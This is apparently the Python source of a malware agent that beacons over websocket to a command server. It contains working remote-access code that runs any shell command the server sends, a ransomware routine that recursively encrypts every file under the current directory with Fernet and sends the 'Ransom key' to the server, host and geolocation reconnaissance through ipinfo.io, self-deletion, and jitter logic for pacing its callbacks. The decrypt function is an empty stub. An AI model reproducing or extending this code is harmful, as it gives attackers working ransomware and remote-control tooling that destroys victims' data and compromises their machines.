#libs
import json
import psutil
import random
import time
import websocket
from cryptography.fernet import Fernet
#reverse shell utils
import os
import subprocess

#container data
import socket

hibernate_time = False
device_us = socket.gethostname()
destroyed = False



def encrypt(directory, key):
    
    files = []
    for file in os.listdir(directory):
        full_path = os.path.join(directory, file)

        if os.path.isfile(full_path):
            files.append(full_path)

        elif os.path.isdir(full_path):
            encrypt(full_path, key)

    for file in files:
        with open(file, 'rb') as f:
            data = f.read()
        
        fernet = Fernet(key)
        encrypted_data = fernet.encrypt(data)

        with open(file, 'wb') as f:
            f.write(encrypted_data)
        




def decrypt(cwd, key):
    pass







def on_message(ws, message): 
    global hibernate_time 
    data = json.loads(message)
    inp = data.get("message")
    cwd = os.getcwd()
    
    if inp.startswith('>'):    
        command = inp[1:].strip().lower()
        print(command.split())
        if command == "hello":
            msg = ' Hello Server\n'
        
        elif command == "help":    
            msg = """List of additional commands available:\n
        Clear               Clear chat room messages
        Encrypt             Encrypt all the files in this directory and its subdirectories
        Infos               Get device informations
        Keylog [x]          Start Keylogger [OPTIONS], set a x timer to stop keylog (X11 Server required)     
        Listen              List of open ports
        Screenshot          Receive screenshot (developing)
        Selfdestroy         Destroy this agent
        Hibernate [x]       Cut connection and block sending lookup requests for x seconds      
        Quit                Cut connection, lookup requests will start then
        Help                Open list of available commands 

    """

        elif command == "encrypt":
            key = Fernet.generate_key()
            ws.send(json.dumps({"message":"Ransom key\n"+str(key)+"\n", 
                                "sender": "",
                                "agent":device_us}))
            encrypt(cwd, key)
            
        
        elif command=="decrypt":
            decrypt(cwd, key)
            

        elif command == "listen":
            cm = "ss -tuln"
            output = subprocess.getoutput(cm) 
            msg = f"{output}\n"

        elif command == "selfdestroy":
            try:
                global destroyed
                ws.send(json.dumps({"message":"This Agent will be deleted", "sender": "", "agent":device_us, "selfdestroy":True}))
                ws.close()
                os.remove(__file__)
                destroyed = True
            except:
                msg="Error"
            
        elif command == "screenshot":
                    cm = "scrot"
                    output = subprocess.getoutput(cm) 
                    msg = f"{output}\n"
                
        elif command.split()[0] == "hibernate":
            try:
                
                hibernate_time = int(command.split()[1])
                if hibernate_time < 0:
                    msg = "'hibernate' argument cannot be negative"
                
                else: 
                    ws.send(json.dumps({"message": "Bye! See you in a bit more than " + str(hibernate_time) + " seconds", "sender": "", "agent":device_us}))
                    ws.close()

            except IndexError as e:
                msg = "'hibernate' needs an argument"
                    
        elif command == "infos":
            #Username
            cm = "whoami" 
            output = subprocess.getoutput(cm)
            msg = f"\n\n ##USER\n\nUsername    {output}\n"

            #groups and permissions
            output = subprocess.getoutput('id ' + output)
            msg += f"Groups      {output}\n"

            #ipv4 address
            cm = "ip addr show eth0 | grep -w inet | awk '{ print $2 }'"
            output = subprocess.getoutput(cm)
            msg += f"\n ##NETWORK\n\nipv4        {output}\n"

            #ipv6 address
            cm = "ip addr show eth0 | grep inet6 | awk '{ print $2 }'"
            output = subprocess.getoutput(cm)
            msg += f"ipv6        {output}\n"

            #MAC 
            cm = "ip link show eth0 | awk '/ether/ { print$2 }'"
            output = subprocess.getoutput(cm)
            msg += f"MAC         {output}\n"

            #CPU 
            cm = "cat /proc/cpuinfo | grep 'model name' | uniq | awk -F: '{print$2}'"
            output =subprocess.getoutput(cm)
            msg += f"\n ##COMPONENTS\n\nCPU        {output}\n"

            #Architecture
            cm = "lscpu | grep Architecture | awk '{print$2}'"
            output = subprocess.getoutput(cm)
            msg += f"Arch        {output}\n"
            
            #RAM
            cm = "cat /proc/meminfo | grep MemTotal | awk -F: '{print$2}'"
            output =subprocess.getoutput(cm)
            msg += f"RAM {output}\n"

            # OS NAME
            cm = "cat /etc/os-release | grep PRETTY"
            output = subprocess.getoutput(cm)
            output = output.split('"')[1]
            msg += f"OS          {output}\n"
            
            # OS VERSION
            cm = "cat /etc/os-release | grep VERSION"
            output = subprocess.getoutput(cm)
            output = output.split('"')[1]
            msg += f"OS ver      {output}\n"
            
            #city
            cm = "wget -qO- https://ipinfo.io | grep city | awk '{print$2}'"
            output = subprocess.getoutput(cm) 
            msg += f"\n ##PLACE\n\nLocation    {output} "

            # regione
            cm = "wget -qO- https://ipinfo.io | grep region | awk '{print$2}'"
            output = subprocess.getoutput(cm) 
            msg += f"{output} "

            #country
            cm = "wget -qO- https://ipinfo.io | grep country | awk '{print$2}'"
            output = subprocess.getoutput(cm).rstrip(',')
            msg += f"{output}\n\n"

        elif command == "clear":
            return

        elif command.startswith("cd "):
            try:
                if command[3:].strip() == "":
                     os.chdir(os.path.expanduser("~"))
                os.chdir(command[3:].strip())
                cwd = os.getcwd()
                msg = ''
            except FileNotFoundError:
                msg = "Directory not found"
        else:
            p = subprocess.run(inp[2:], shell=True, capture_output=True, text=True)
            msg = p.stdout + p.stderr
            print(msg)
        
        ws.send(json.dumps({"message": '$' + cwd + '\n\n' + msg, "sender": "", "agent":device_us}))


def on_error(ws, error):
    print(error)


def on_close(ws, close_status_code, close_msg):
    print("### Closing Connection ###")
    print("Close Status Code:", close_status_code)
    print("Close message:", close_msg)
    out = ("Close Status Code:", close_status_code)
    print("Commencing Lookup Requests...")


def on_open(ws, agent_info):
    global device_us
    print("Opened connection with Server on Websocket\n")
    ws.send(json.dumps({"message": "Connection Established Successfully", "sender": device_us, "agent_info": agent_info} ))

def connect():
    global device_us
    agent_info={
        "username": device_us,
        "agent_location": __file__,
        "ip": socket.gethostbyname(device_us) 
    }
    
    print(agent_info)
    print("Establishing connection")
    # Create a new WebSocket connection
    ws = websocket.WebSocketApp(f"ws://server:8000/ws/devices/{device_us}/", 
                                on_open=lambda ws: on_open(ws, agent_info), 
                                on_message=on_message, 
                                on_error=on_error, 
                                on_close=on_close)
    # Run the WebSocket connection asynchronously without blocking
    ws.run_forever()

def monitor():
    while True:
        #gain cpu stats
        cpu_percent = psutil.cpu_percent(interval=1)
        print(f"CPU usage: {cpu_percent}%")

        #gain meme stats
        memory_info = psutil.virtual_memory()
        total_memory = memory_info.total / (1024 ** 2)  # to MB
        available_memory = memory_info.available / (1024 ** 2)  # to MB
        used_memory = total_memory - available_memory
        memory_percent = memory_info.percent
        print(f"Mem usage: {used_memory:.2f} MB / {total_memory:.2f} MB ({memory_percent:.2f}%)")

        return cpu_percent, memory_percent


if __name__ == "__main__":
    #websocket.enableTrace(True)
    
    while True:
        if destroyed == True:
            break

        if hibernate_time != False:#sleep if True
            time.sleep(hibernate_time)
        hibernate_time = False #rese var

        x = monitor()
        base = 2.5
        if x[0] < 15:#null allert  10-25 sec
            jitter = random.uniform(4, 10)
            lookup = base * jitter
        elif x[0] < 25:#medium allert 60sec 180sec
            jitter = random.uniform(24, 72)
            lookup = base * jitter

        elif x[0] < 40:#high allert 120 sec-300 sec
            jitter = random.uniform(48, 120)
            lookup = base * jitter

        else: #max allert 1000 sec 1500 sec
            jitter = random.uniform(400, 600)
            lookup = base * jitter

        lookup = 5 #test
        
        print(lookup)
        time.sleep(lookup)
        connect()
